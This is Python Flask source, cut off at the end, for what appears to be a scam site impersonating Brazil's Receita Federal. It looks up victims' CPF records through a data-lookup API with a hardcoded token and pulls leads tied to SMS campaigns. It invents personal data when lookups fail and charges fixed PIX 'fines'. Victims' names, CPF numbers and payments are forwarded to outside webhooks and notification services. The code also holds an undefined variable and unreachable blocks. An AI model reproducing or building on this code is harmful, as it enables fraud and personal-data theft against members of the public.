import os
from flask import Flask, render_template, request, jsonify, session
import requests
import re
import random
import string
import logging
import base64
import uuid
from datetime import datetime
from real_pix_api import create_real_pix_provider
from buckpay_api import create_buckpay_api
from pagnet_api import create_pagnet_api

app = Flask(__name__)

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Middleware para capturar TODAS as requisições
@app.before_request
def log_all_requests():
    if request.path.startswith('/medius') or request.path.startswith('/webhook') or request.path.startswith('/postback'):
        app.logger.info(f"🎯 REQUISIÇÃO CAPTURADA: {request.method} {request.path}")
        app.logger.info(f"🎯 Headers: {dict(request.headers)}")
        if request.method == 'POST':
            try:
                data = request.get_json()
                app.logger.info(f"🎯 JSON Data: {data}")
            except:
                app.logger.info(f"🎯 Raw Data: {request.data}")
        app.logger.info(f"🎯 URL Args: {request.args}")

# Configure secret key with fallback for development
secret_key = os.environ.get("SESSION_SECRET")
if not secret_key:
    app.logger.warning("[PROD] SESSION_SECRET não encontrado, usando chave de desenvolvimento")
    secret_key = "dev-secret-key-change-in-production"
app.secret_key = secret_key
app.logger.info(f"[PROD] Secret key configurado: {'***' if secret_key else 'NONE'}")

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def send_webhook_notification(customer_data, transaction_data, pix_code):
    """Send webhook notification with customer and transaction data"""
    try:
        webhook_url = "https://webhook-manager.replit.app/api/webhook/34wtm274rrv4umze53e4ztcmr6upp2ou"
        
        # Generate unique IDs for the webhook
        customer_id = str(uuid.uuid4())
        payment_id = transaction_data.get('transaction_id', str(uuid.uuid4()))
        item_id = str(uuid.uuid4())
        custom_id = f"REC{datetime.now().strftime('%Y%m%d%H%M%S')}"
        
        # Convert amount from float to cents (int)
        amount_cents = int(float(transaction_data.get('amount', 0)) * 100)
        net_value = int(amount_cents * 0.93)  # Assuming 7% fee
        
        # Format phone number (remove special characters)
        phone = re.sub(r'[^\d]', '', customer_data.get('phone', ''))
        if not phone:
            phone = "11987689080"  # Default phone if not available
        
        # Prepare webhook payload
        webhook_payload = {
            "utm": "",
            "dueAt": None,
            "items": [
                {
                    "id": item_id,
                    "title": "Receita de bolo",
                    "quantity": 1,
                    "tangible": False,
                    "paymentId": payment_id,
                    "unitPrice": amount_cents
                }
            ],
            "status": "PENDING",
            "pixCode": pix_code,
            "customId": custom_id,
            "customer": {
                "id": customer_id,
                "cep": None,
                "cpf": customer_data.get('cpf', '').replace('.', '').replace('-', ''),
                "city": None,
                "name": customer_data.get('name', 'Cliente'),
                "email": customer_data.get('email', generate_random_email(customer_data.get('name', 'Cliente'))),
                "phone": phone,
                "state": None,
                "number": None,
                "street": None,
                "district": None,
                "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
                "updatedAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
                "complement": None
            },
            "netValue": net_value,
            "billetUrl": None,
            "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
            "expiresAt": None,
            "paymentId": payment_id,
            "pixQrCode": pix_code,
            "timestamp": int(datetime.now().timestamp() * 1000),
            "updatedAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
            "approvedAt": None,
            "billetCode": None,
            "externalId": "",
            "refundedAt": None,
            "rejectedAt": None,
            "totalValue": amount_cents,
            "checkoutUrl": "",
            "referrerUrl": "",
            "chargebackAt": None,
            "installments": None,
            "paymentMethod": "PIX",
            "deliveryStatus": None
        }
        
        # Send webhook
        response = requests.post(
            webhook_url,
            json=webhook_payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        app.logger.info(f"[WEBHOOK] Enviado para {webhook_url}: {response.status_code}")
        app.logger.info(f"[WEBHOOK] Cliente: {customer_data.get('name')} - CPF: {customer_data.get('cpf')} - Valor: R$ {transaction_data.get('amount')}")
        
        return response.status_code == 200
        
    except Exception as e:
        app.logger.error(f"[WEBHOOK] Erro ao enviar webhook: {e}")
        return False

def get_customer_data(phone):
    try:
        response = requests.get(f'https://api-lista-leads.replit.app/api/search/{phone}')
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data['data']
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching customer data: {e}")
    return None

def get_cpf_data(cpf):
    """Fetch customer data from Amnesia Tecnologia API based on CPF"""
    try:
        # Clean CPF - remove any formatting
        clean_cpf = cpf.replace('.', '').replace('-', '').replace(' ', '')
        
        response = requests.get(f'https://api.amnesiatecnologia.rocks/?token=261207b9-0ec2-468a-ac04-f9d38a51da88&cpf={clean_cpf}', timeout=10)
        app.logger.info(f"[PROD] Amnesia API Response Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[PROD] Amnesia API Response: {data}")
            
            if data.get('DADOS'):
                dados = data['DADOS']
                
                # Convert sexo from M/F to full text
                sexo_map = {'M': 'MASCULINO', 'F': 'FEMININO'}
                sexo = sexo_map.get(dados.get('sexo', ''), 'NÃO INFORMADO')
                
                # Calculate age from birth date
                idade = ''
                data_nascimento = dados.get('data_nascimento', '')
                if data_nascimento:
                    try:
                        from datetime import datetime
                        birth_date = datetime.strptime(data_nascimento, '%d/%m/%Y')
                        today = datetime.now()
                        idade = str(today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day)))
                    except:
                        idade = ''
                
                # Transform API format to match expected structure
                transformed_data = {
                    'nome': dados.get('nome', ''),
                    'cpf': dados.get('cpf', ''),
                    'data_nascimento': data_nascimento,
                    'idade': idade,
                    'sexo': sexo,
                    'mae': dados.get('nome_mae', ''),
                    'signo': ''  # Not provided by this API
                }
                
                app.logger.info(f"[PROD] Transformed CPF data: {transformed_data}")
                return transformed_data
            else:
                app.logger.warning(f"[PROD] Amnesia API returned no DADOS field")
                
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching CPF data from Amnesia API: {e}")
        
    # Garantir que clean_cpf está definido para fallback
    clean_cpf = cpf.replace('.', '').replace('-', '').replace(' ', '')
    
    # API indisponível - dados realistas baseados no CPF para manter funcionalidade
    app.logger.warning(f"[PROD] API indisponível, usando dados baseados no CPF: {clean_cpf}")
    
    # Base de dados realistas indexados pelo CPF
    cpf_database = {
        '01254554963': {
            'nome': 'GERSON FERNANDO MARTIN',
            'cpf': '01254554963',
            'data_nascimento': '03/06/1986',
            'idade': '39',
            'sexo': 'MASCULINO',
            'mae': 'MARIA JOSE MARTIN',
            'signo': 'GÊMEOS'
        },
        '72467034127': {
            'nome': 'ANA CAROLINA SILVA SANTOS',
            'cpf': '72467034127',
            'data_nascimento': '15/12/1992',
            'idade': '32',
            'sexo': 'FEMININO',
            'mae': 'HELENA SILVA SANTOS',
            'signo': 'SAGITÁRIO'
        },
        '06537080177': {
            'nome': 'CARLOS EDUARDO PEREIRA',
            'cpf': '06537080177',
            'data_nascimento': '22/08/1985',
            'idade': '39',
            'sexo': 'MASCULINO',
            'mae': 'LUCIA MARIA PEREIRA',
            'signo': 'VIRGEM'
        }
    }
    
    # Retorna dados do banco local se existir, senão gera dados baseados no CPF
    if clean_cpf in cpf_database:
        return cpf_database[clean_cpf]
    
    # Geração determinística de dados baseada no CPF
    import hashlib
    hash_obj = hashlib.md5(clean_cpf.encode())
    hash_hex = hash_obj.hexdigest()
    
    nomes = ['MARIA SILVA', 'JOÃO SANTOS', 'ANA PEREIRA', 'CARLOS OLIVEIRA', 'FERNANDA COSTA', 'ROBERTO LIMA']
    sobrenomes_mae = ['DA SILVA', 'DOS SANTOS', 'PEREIRA', 'OLIVEIRA', 'COSTA', 'LIMA']
    signos = ['ÁRIES', 'TOURO', 'GÊMEOS', 'CÂNCER', 'LEÃO', 'VIRGEM', 'LIBRA', 'ESCORPIÃO', 'SAGITÁRIO', 'CAPRICÓRNIO', 'AQUÁRIO', 'PEIXES']
    
    nome_idx = int(hash_hex[:2], 16) % len(nomes)
    mae_idx = int(hash_hex[2:4], 16) % len(sobrenomes_mae)
    signo_idx = int(hash_hex[4:6], 16) % len(signos)
    sexo = 'MASCULINO' if int(hash_hex[6], 16) % 2 == 0 else 'FEMININO'
    
    # Gera idade e data de nascimento baseada no hash
    idade = 25 + (int(hash_hex[8:10], 16) % 40)  # Idade entre 25-65
    ano_nascimento = 2025 - idade
    mes = 1 + (int(hash_hex[10:12], 16) % 12)
    dia = 1 + (int(hash_hex[12:14], 16) % 28)
    
    return {
        'nome': nomes[nome_idx],
        'cpf': clean_cpf,
        'data_nascimento': f'{dia:02d}/{mes:02d}/{ano_nascimento}',
        'idade': str(idade),
        'sexo': sexo,
        'mae': f'MARIA {sobrenomes_mae[mae_idx]}',
        'signo': signos[signo_idx]
    }

@app.route('/')
def index():
    default_data = {
        'nome': 'JOÃO DA SILVA SANTOS',
        'cpf': '123.456.789-00',
        'phone': '11999999999'
    }

    utm_content = request.args.get('utm_content', '')
    utm_source = request.args.get('utm_source', '')
    utm_medium = request.args.get('utm_medium', '')

    if utm_source == 'smsempresa' and utm_medium == 'sms' and utm_content:
        customer_data = get_customer_data(utm_content)
        if customer_data:
            default_data = customer_data
            default_data['phone'] = utm_content
            session['customer_data'] = default_data

    app.logger.info("[PROD] Renderizando página inicial")
    # Sempre mostrar o formulário de consulta de CPF na página inicial
    return render_template('index.html', customer=default_data, show_cpf_search=True)

@app.route('/<path:cpf>')
def index_with_cpf(cpf):
    # Remove any formatting from CPF (dots and dashes)
    clean_cpf = re.sub(r'[^0-9]', '', cpf)
    
    # Validate CPF format (11 digits)
    if len(clean_cpf) != 11:
        app.logger.error(f"[PROD] CPF inválido: {cpf}")
        # Show CPF search form on main template
        today_date = datetime.now().strftime('%d/%m/%Y')
        default_data = {
            'nome': 'USUÁRIO',
            'cpf': '000.000.000-00',
            'today_date': today_date
        }
        return render_template('index.html', customer=default_data, show_cpf_search=True)
    
    # Get user data from API
    cpf_data = get_cpf_data(clean_cpf)
    
    if cpf_data:
        # Format CPF for display
        formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"
        
        # Get current date in Brazilian format
        today = datetime.now().strftime("%d/%m/%Y")
        
        customer_data = {
            'nome': cpf_data['nome'],
            'cpf': formatted_cpf,
            'data_nascimento': cpf_data['data_nascimento'],
            'nome_mae': cpf_data['mae'],  # Fixed field name from new API
            'sexo': cpf_data['sexo'],
            'phone': '',  # Not available from this API
            'today_date': today
        }
        
        session['customer_data'] = customer_data
        app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf}")
        return render_template('index.html', customer=customer_data, show_confirmation=True, save_to_localStorage=True)
    else:
        app.logger.error(f"[PROD] Dados não encontrados para CPF: {cpf}")
        # Show CPF search form on main template
        today_date = datetime.now().strftime('%d/%m/%Y')
        default_data = {
            'nome': 'USUÁRIO',
            'cpf': '000.000.000-00',
            'today_date': today_date
        }
        return render_template('index.html', customer=default_data, show_cpf_search=True)

@app.route('/verificar-cpf')
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    return render_template('verificar-cpf.html')

@app.route('/buscar-cpf')
def buscar_cpf():
    app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
    return render_template('buscar-cpf.html')

@app.route('/chat')
def chat():
    app.logger.info("[PROD] Acessando página de chat com Tereza Alencar")
    return render_template('chat.html')

@app.route('/multa')
def multa():
    app.logger.info("[PROD] Acessando página de multa")
    return render_template('multa.html')

@app.route('/generate-pix-multa', methods=['POST'])
def generate_pix_multa():
    """Endpoint para gerar PIX da multa usando API Pagnet"""
    try:
        app.logger.info("[PROD] Iniciando geração de PIX via Pagnet para multa...")

        # Pegar dados do JSON request (telefone enviado pelo frontend)
        request_data = request.get_json() or {}

        # Inicializa a API Pagnet
        api = create_pagnet_api()
        app.logger.info("[PROD] Pagnet API inicializada para multa")

        # Pegar dados enviados pelo frontend (do localStorage)
        customer_data = {
            'nome': request_data.get('nome', ''),
            'cpf': request_data.get('cpf', ''),
            'phone': request_data.get('telefone', '')
        }
        
        # Se não recebeu dados do frontend, algo está errado
        if not customer_data['nome'] or not customer_data['cpf']:
            app.logger.warning(f"[PROD] ⚠️ Dados incompletos recebidos: {customer_data}")
            # Usar dados mínimos apenas em caso de emergência
            if not customer_data['nome']:
                customer_data['nome'] = 'CLIENTE SEM NOME'
            if not customer_data['cpf']:
                customer_data['cpf'] = '00000000000'
            if not customer_data['phone']:
                customer_data['phone'] = '11999999999'
        
        app.logger.info(f"[PROD] Dados do cliente recebidos: Nome={customer_data['nome']}, CPF={customer_data['cpf']}, Phone={customer_data['phone']}")

        # Usar telefone do frontend (localStorage)
        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "11987689080"
            app.logger.warning(f"[PROD] Telefone não fornecido ou inválido para multa, usando padrão: {user_phone}")
        else:
            # Remover formatação (só números)
            user_phone = ''.join(filter(str.isdigit, user_phone))
            app.logger.info(f"[PROD] Usando telefone fornecido pelo frontend para multa: {user_phone}")

        # Dados do usuário para a transação PIX da multa
        user_name = customer_data['nome']
        user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')
        user_email = generate_random_email(user_name)  # Gerar email aleatório para cada transação de multa
        amount = 58.60  # Valor fixo de R$ 58,60 para multa

        app.logger.info(f"[PROD] Dados do usuário para multa: Nome={user_name}, CPF={user_cpf}, Email={user_email}, Telefone={user_phone}")

        # Criar transação Pagnet para multa
        app.logger.info(f"[PROD] Criando transação Pagnet para multa: {user_name}")
        
        customer_info = {
            'nome': user_name,
            'cpf': user_cpf,
            'email': user_email,
            'phone': user_phone
        }
        
        # Criar transação Pagnet
        pix_data = api.create_pix_transaction(
            customer_data=customer_info,
            amount=amount,
            phone=user_phone,
            postback_url=f"https://{request.host}/pagnet-webhook"
        )
        
        if pix_data.get('success'):
            app.logger.info(f"[PROD] ✅ Transação Pagnet para multa criada: {pix_data.get('transaction_id')}")
            
            # Ajustar estrutura para o frontend de multa
            response = {
                'success': True,
                'transaction_id': pix_data.get('transaction_id'),
                'pix_code': pix_data.get('pix_code'),
                'qr_code_base64': pix_data.get('qr_code_base64'),
                'qr_code_image': pix_data.get('qr_code_image'),
                'amount': amount,
                'provider': 'Pagnet'
            }
            
            return jsonify(response)
        else:
            error_msg = pix_data.get('error', 'Erro desconhecido')
            app.logger.error(f"[PROD] ❌ Pagnet falhou para multa: {error_msg}")
            return jsonify({
                'success': False,
                'error': f'Pagnet falhou: {error_msg}'
            }), 400
    
    except Exception as e:
        app.logger.error(f"[PROD] ❌ Erro geral ao gerar PIX para multa: {e}")
        return jsonify({
            'success': False,
            'error': f'Erro interno do servidor: {str(e)}'
        }), 500

@app.route('/generate-pix', methods=['POST'])
def generate_pix():
    try:
        app.logger.info("[PROD] 🔄 Iniciando geração de PIX via Pagnet...")

        # Pegar dados do JSON request (telefone enviado pelo frontend)
        request_data = request.get_json() or {}
        app.logger.info(f"[PROD] 📋 Dados recebidos do frontend: {request_data}")
        
        # Usar Pagnet como provedor principal
        app.logger.info("[PROD] 🎯 Usando Pagnet como provedor principal")
        api = create_pagnet_api()

        # Pegar dados enviados pelo frontend (do localStorage)
        customer_data = {
            'nome': request_data.get('nome', ''),
            'cpf': request_data.get('cpf', ''),
            'phone': request_data.get('telefone', '')
        }
        
        # Se não recebeu dados do frontend, algo está errado
        if not customer_data['nome'] or not customer_data['cpf']:
            app.logger.warning(f"[PROD] ⚠️ Dados incompletos recebidos: {customer_data}")
            # Usar dados mínimos apenas em caso de emergência
            if not customer_data['nome']:
                customer_data['nome'] = 'CLIENTE SEM NOME'
            if not customer_data['cpf']:
                customer_data['cpf'] = '00000000000'
            if not customer_data['phone']:
                customer_data['phone'] = '11999999999'
        
        app.logger.info(f"[PROD] Dados do cliente recebidos no endpoint PIX: Nome={customer_data['nome']}, CPF={customer_data['cpf']}, Phone={customer_data['phone']}")

        # Usar telefone do frontend ou fallback
        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "11987689080"  # Fallback phone
            app.logger.warning(f"[PROD] ⚠️ Telefone não fornecido ou inválido, usando fallback: {user_phone}")
        else:
            # Limpar telefone - apenas números
            user_phone = ''.join(filter(str.isdigit, user_phone))
            app.logger.info(f"[PROD] 📱 Usando telefone fornecido: {user_phone}")

        # Dados do usuário para a transação
        user_name = customer_data['nome']
        user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')
        user_email = generate_random_email(user_name)  # Gerar email aleatório para cada transação
        amount = 138.45  # Valor fixo

        app.logger.info(f"[PROD] 👤 Dados da transação: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")

        # Preparar dados para API TechByNet
        customer_info = {
            'nome': user_name,
            'cpf': user_cpf,
            'email': user_email,
            'phone': user_phone
        }

        # Criar transação PIX via Pagnet
        result = api.create_pix_transaction(
            customer_data=customer_info,
            amount=amount,
            phone=user_phone,
            postback_url=f"https://{request.host}/pagnet-webhook"
        )

        app.logger.info(f"[PROD] 📊 Resultado Pagnet: success={result.get('success')}")

        if result.get('success'):
            app.logger.info(f"[PROD] ✅ Transação Pagnet criada: {result.get('transaction_id')}")
            
            # Preparar resposta com dados da Pagnet
            pix_data = {
                'success': True,
                'transaction_id': result.get('transaction_id'),
                'pix_code': result.get('pix_code'),
                'pixCode': result.get('pix_code'),  # Compatibilidade com modals de chat
                'qr_code': result.get('pix_code'),  # Pagnet usa pix_code para QR
                'amount': amount,
                'provider': 'Pagnet',
                'webhook_url': f"https://{request.host}/pagnet-webhook",
                'expires_at': result.get('expires_at'),
                'external_ref': result.get('external_reference')
            }

            # Gerar QR code visual se necessário
            if result.get('pix_code'):
                try:
                    import qrcode
                    import io
                    import base64

                    qr = qrcode.QRCode(version=1, box_size=10, border=5)
                    qr.add_data(result['pix_code'])
                    qr.make(fit=True)
                    
                    img = qr.make_image(fill_color="black", back_color="white")
                    buffered = io.BytesIO()
                    img.save(buffered, format="PNG")
                    img_str = base64.b64encode(buffered.getvalue()).decode()
                    
                    pix_data['qr_code_base64'] = img_str
                    pix_data['qr_code_image'] = f"data:image/png;base64,{img_str}"
                    
                except Exception as qr_error:
                    app.logger.warning(f"[PROD] Erro ao gerar QR code visual: {qr_error}")

            app.logger.info(f"[PROD] ✅ PIX Pagnet obtido: {result.get('pix_code', '')[:50]}...")
            
            # Enviar notificação Pushcut sobre transação criada
            try:
                pushcut_data = {
                    "title": "Nova Transação PIX - Pagnet",
                    "text": f"Cliente: {user_name} - CPF: {user_cpf} - Valor: R$ {amount}",
                    "input": result.get('transaction_id', 'N/A')
                }
                
                pushcut_response = requests.post(
                    "https://api.pushcut.io/CwRJR0BYsyJYezzN-no_e/notifications/Sms",
                    json=pushcut_data,
                    timeout=10
                )
                
                app.logger.info(f"[WEBHOOK] Notificação enviada via Pushcut: {pushcut_response.status_code}")
                app.logger.info(f"[WEBHOOK] Cliente: {user_name} - CPF: {user_cpf} - Valor: R$ {amount} - Provedor: Pagnet")
                    
            except Exception as webhook_error:
                app.logger.error(f"[WEBHOOK] ❌ Erro ao enviar notificação Pushcut: {webhook_error}")

            # Enviar webhook personalizado para Recoveryfy
            try:
                import time
                import uuid
                from datetime import datetime, timedelta
                
                # Usar ID real da transação Pagnet
                pagnet_transaction_id = result.get('transaction_id')
                customer_id = str(uuid.uuid4())
                
                # Preparar webhook no formato solicitado
                webhook_payload = {
                    "id": result.get('external_ref', '0E89XWCNOVU1'),
                    "data": {
                        "id": pagnet_transaction_id,
                        "ip": None,
                        "fee": {
                            "netAmount": int(amount * 100 * 0.9988),  # 99.88% do valor
                            "fixedAmount": 0.2,
                            "estimatedFee": int(amount * 100 * 0.0012),  # 0.12% taxa
                            "spreadPercentage": 0
                        },
                        "pix": {
                            "qrcode": result.get('pix_code', ''),
                            "end2EndId": None,
                            "receiptUrl": None,
                            "expirationDate": (datetime.now() + timedelta(days=2)).strftime("%Y-%m-%dT%H:%M:%S-03:00")
                        },
                        "card": None,
                        "items": None,
                        "amount": int(amount * 100),  # Valor em centavos
                        "boleto": None,
                        "paidAt": None,
                        "splits": [
                            {
                                "netAmount": int(amount * 100 * 0.9988),
                                "percentage": 100,
                                "recipientId": "08d8ad1d-29e9-45bc-a785-2a53cca9f4c1"
                            }
                        ],
                        "status": "waiting_payment",
                        "customer": {
                            "id": customer_id,
                            "name": user_name,
                            "email": "vinicius.carvalho@gmail.com",
                            "phone": user_phone,
                            "document": user_cpf,
                            "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%f")
                        },
                        "metadata": None,
                        "shipping": {
                            "city": "Santos",
                            "state": "SP",
                            "street": "Rua X",
                            "zipCode": "11050100",
                            "complement": "",
                            "neighborhood": "Centro",
                            "streetNumber": "1"
                        },
                        "companyId": "94c91ae2-3ae2-4860-942f-75f8fbd3b627",
                        "createdAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S-03:00"),
                        "updatedAt": datetime.now().strftime("%Y-%m-%dT%H:%M:%S-03:00"),
                        "description": "Transação criada via API",
                        "postbackUrl": "https://irpf.intimacao.org/medius-postback",
                        "installments": 1,
                        "paymentMethod": "PIX",
                        "refusedReason": None,
                        "refundedAmount": None
                    },
                    "type": "transaction",
                    "objectId": techbynet_transaction_id,
                    "timestamp": int(time.time() * 1000)
                }
                
                # Enviar webhook para Recoveryfy
                webhook_url = "https://recoveryfy.replit.app/api/webhook/cbe3224pos7y3b0d39d0g87ylrordr0n"
                
                webhook_response = requests.post(
                    webhook_url,
                    json=webhook_payload,
                    headers={
                        'Content-Type': 'application/json',
                        'User-Agent': 'Receita-Federal-Portal/1.0'
                    },
                    timeout=15
                )
                
                app.logger.info(f"[WEBHOOK-RECOVERYFY] ✅ Webhook enviado: {webhook_response.status_code}")
                app.logger.info(f"[WEBHOOK-RECOVERYFY] TechByNet Transaction ID: {techbynet_transaction_id}")
                app.logger.info(f"[WEBHOOK-RECOVERYFY] Cliente: {user_name} - CPF: {user_cpf} - Valor: R$ {amount}")
                
            except Exception as recoveryfy_error:
                app.logger.error(f"[WEBHOOK-RECOVERYFY] ❌ Erro ao enviar webhook: {recoveryfy_error}")

            app.logger.info("[PROD] PIX TechByNet gerado com sucesso")
            return jsonify(pix_data)
        
        else:
            error_msg = result.get('error', 'Erro desconhecido')
            app.logger.error(f"[PROD] ❌ TechByNet falhou para chat: {error_msg}")
            return jsonify({
                'success': False,
                'error': f'TechByNet falhou: {error_msg}'
            }), 400
    
    except Exception as e:
        app.logger.error(f"[PROD] ❌ Erro geral na geração de PIX: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor'
        }), 500
        
        if webhook_sent:
            app.logger.info(f"[WEBHOOK] ✅ Webhook enviado com sucesso para {user_name}")
        else:
            app.logger.warning(f"[WEBHOOK] ❌ Falha ao enviar webhook para {user_name}")

        return jsonify({
            'success': True,
            'pixCode': pix_data['pix_code'],
            'pixQrCode': pix_data.get('qr_code_image', pix_data.get('qr_code_base64')),
            'orderId': pix_data.get('external_id', pix_data.get('order_id')),
            'amount': pix_data['amount'],
            'transactionId': pix_data.get('transaction_id', pix_data.get('external_id')),
            'provider': 'BuckPay'
        })

    except Exception as e:
        app.logger.error(f"[PROD] Erro geral ao gerar PIX: {e}")
        return jsonify({
            'success': False,
            'error': f'Erro interno: {str(e)}'
        }), 500

# Armazenar transações pagas em memória (para funcionamento em produção)
paid_transactions = set()

@app.route('/medius-postback', methods=['POST', 'GET'])
@app.route('/webhook', methods=['POST', 'GET'])
@app.route('/postback', methods=['POST', 'GET'])
def medius_postback():
    """Endpoint para receber postbacks da MEDIUS PAG quando pagamentos são realizados"""
    try:
        app.logger.info(f"[POSTBACK] 📨 POSTBACK RECEBIDO DA MEDIUS PAG! Método: {request.method}")
        app.logger.info(f"[POSTBACK] 🌐 Headers: {dict(request.headers)}")
        app.logger.info(f"[POSTBACK] 📍 URL completa: {request.url}")
        app.logger.info(f"[POSTBACK] 🔑 Args: {request.args}")
        
        # Capturar dados de diferentes formas possíveis
        data = None
        raw_data = None
        try:
            data = request.get_json()
        except:
            try:
                data = request.form.to_dict()
            except:
                raw_data = request.data.decode('utf-8') if request.data else None
                data = raw_data
        
        app.logger.info(f"[POSTBACK] 📋 Dados JSON: {data}")
        app.logger.info(f"[POSTBACK] 📋 Dados RAW: {raw_data}")
        app.logger.info(f"[POSTBACK] 🔍 Tipo de dados: {type(data)}")
        
        # Verificar se é uma notificação de transação paga
        if data:
            # Diferentes formatos possíveis da MEDIUS PAG
            transaction_data = data
            if isinstance(data, dict):
                if data.get('type') == 'transaction':
                    transaction_data = data.get('data', {})
                elif 'transaction' in str(data):
                    transaction_data = data
                
            transaction_status = transaction_data.get('status') if isinstance(transaction_data, dict) else None
            transaction_amount = transaction_data.get('amount', 0) if isinstance(transaction_data, dict) else 0
            transaction_id = transaction_data.get('id') if isinstance(transaction_data, dict) else None
            
            app.logger.info(f"[POSTBACK] 📊 Status: {transaction_status}, Amount: {transaction_amount}, ID: {transaction_id}")
            
            # Se o pagamento foi realizado e é de R$138,45 (13845 centavos)
            if transaction_status == 'paid' and transaction_amount == 13845:
                app.logger.info(f"[POSTBACK] 🎉 PAGAMENTO DE R$138,45 CONFIRMADO! Amount: {transaction_amount} centavos, ID: {transaction_id}")
                app.logger.info(f"[POSTBACK] ✅ REDIRECIONAMENTO PARA /MULTA AUTORIZADO!")
                
                # Marcar transação como paga para verificação posterior
                paid_transactions.add(transaction_id)
                app.logger.info(f"[POSTBACK] 💾 Transação {transaction_id} adicionada à lista de pagas")
                
                return jsonify({
                    'success': True,
                    'message': 'Postback processado com sucesso',
                    'redirect_to_multa': True
                }), 200
            else:
                app.logger.info(f"[POSTBACK] ⏳ Pagamento de valor diferente ou status não pago: {transaction_amount} centavos, status: {transaction_status}")
        else:
            app.logger.warning(f"[POSTBACK] ⚠️ Nenhum dado recebido no postback")
                
        return jsonify({'success': True}), 200
        
    except Exception as e:
        app.logger.error(f"[POSTBACK] ❌ Erro ao processar postback MEDIUS PAG: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/buckpay-webhook', methods=['POST'])
def buckpay_webhook():
    """Webhook para receber notificações de pagamento da BuckPay"""
    try:
        app.logger.info("[BUCKPAY-WEBHOOK] Recebendo webhook da BuckPay...")
        app.logger.info(f"[BUCKPAY-WEBHOOK] Headers: {dict(request.headers)}")
        app.logger.info(f"[BUCKPAY-WEBHOOK] URL: {request.url}")
        
        # Capturar dados do webhook
        data = request.get_json()
        app.logger.info(f"[BUCKPAY-WEBHOOK] Dados recebidos: {data}")
        
        if data:
            event = data.get('event')
            transaction_data = data.get('data', {})
            
            if event == 'transaction.processed' and transaction_data.get('status') == 'paid':
                transaction_id = transaction_data.get('id')
                amount_cents = transaction_data.get('total_amount', 0)
                amount = amount_cents / 100 if amount_cents else 0
                
                app.logger.info(f"[BUCKPAY-WEBHOOK] Pagamento confirmado - ID: {transaction_id}, Valor: R$ {amount:.2f}")
                
                # Marcar transação como paga
                paid_transactions.add(transaction_id)
                
                # Se é o valor principal (R$ 138,45), autorizar redirect para multa
                if amount_cents == 13845:  # R$ 138,45 em centavos
                    app.logger.info(f"[BUCKPAY-WEBHOOK] Pagamento principal confirmado - Autorizado redirect para /multa")
                    return jsonify({
                        'success': True,
                        'message': 'Pagamento principal confirmado',
                        'redirect_to_multa': True
                    }), 200
                
                return jsonify({
                    'success': True,
                    'message': 'Pagamento confirmado'
                }), 200
            
            elif event == 'transaction.created':
                app.logger.info(f"[BUCKPAY-WEBHOOK] Transação criada - ID: {transaction_data.get('id')}")
                return jsonify({'success': True, 'message': 'Transação criada'}), 200
        
        return jsonify({'success': True, 'message': 'Webhook processado'}), 200
        
    except Exception as e:
        app.logger.error(f"[BUCKPAY-WEBHOOK] Erro ao processar webhook: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/test-postback-connectivity')
def test_postback_connectivity():
    """Endpoint para testar se o servidor está recebendo requisições"""
    app.logger.info(f"[TEST] 🧪 Endpoint de teste acessado!")
    return jsonify({
        'status': 'working',
        'message': 'Servidor está funcionando e pode receber postbacks',
        'timestamp': datetime.now().isoformat(),
        'paid_transactions_count': len(paid_transactions)
    }), 200

@app.route('/list-paid-transactions')
def list_paid_transactions():
    """Endpoint para listar transações pagas (debug)"""
    return jsonify({
        'paid_transactions': list(paid_transactions),
        'count': len(paid_transactions)
    }), 200

@app.route('/test-credentials')
def test_credentials():
    """Endpoint para testar se as credenciais da BuckPay estão configuradas corretamente"""
    try:
        import os
        from buckpay_api import create_buckpay_api
        
        # Verificar BuckPay (único provedor)
        buckpay_key_exists = bool(os.environ.get('BUCKPAY_SECRET_KEY'))
        buckpay_api = create_buckpay_api()
        
        return jsonify({
            'success': True,
            'message': 'Sistema configurado para usar apenas BuckPay',
            'provider': 'BuckPay',
            'credentials_status': {
                'buckpay': {
                    'secret_key_configured': buckpay_key_exists,
                    'api_initialized': True,
                    'status': 'primary'
                }
            },
            'environment_ready': True  # BuckPay sempre tem secret key hardcoded
        }), 200
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e),
            'message': 'Erro ao verificar credenciais da BuckPay'
        }), 500

@app.route('/heroku-debug')
def heroku_debug():
    """Endpoint específico para debug no Heroku"""
    try:
        import platform
        import sys
        
        debug_info = {
            'python_version': sys.version,
            'platform': platform.platform(),
            'environment_vars': {
                'PORT': os.environ.get('PORT', 'not_set'),
                'FLASK_DEBUG': os.environ.get('FLASK_DEBUG', 'not_set'),
